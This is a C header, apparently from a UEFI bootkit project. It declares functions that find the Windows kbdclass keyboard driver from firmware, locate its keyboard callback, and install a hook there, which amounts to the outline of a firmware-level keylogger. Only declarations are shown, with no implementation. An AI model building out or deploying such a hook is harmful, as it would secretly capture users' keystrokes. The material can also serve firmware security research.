#ifndef __KERNEL_H__
#define __KERNEL_H__

#include <Uefi.h>
#include <IndustryStandard/PeImage.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include "Hook.h"

extern LIST_ENTRY* g_PsLoadedModuleList;
extern UINT64 g_KeyboardFound;
extern VOID* g_KbdBaseAddress;

VOID SerialWrite(CHAR8* str);
VOID SerialWriteHex(UINT64 val);
BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName);
VOID* FindKeyboardCallback(VOID* TextBase, UINT32 TextSize);
BOOLEAN InstallKeyboardHook(VOID* Target);
VOID* EFIAPI FindNtosExportByName(VOID* KernelBase, CHAR8* ExportName);
PKLDR_DATA_TABLE_ENTRY FindKbdclassModule();
VOID ScanForKeyboardDriver();
VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName);
BOOLEAN GetTextSection( VOID* ImageBase, VOID** TextBase, UINT32* TextSize);
BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName);

#endif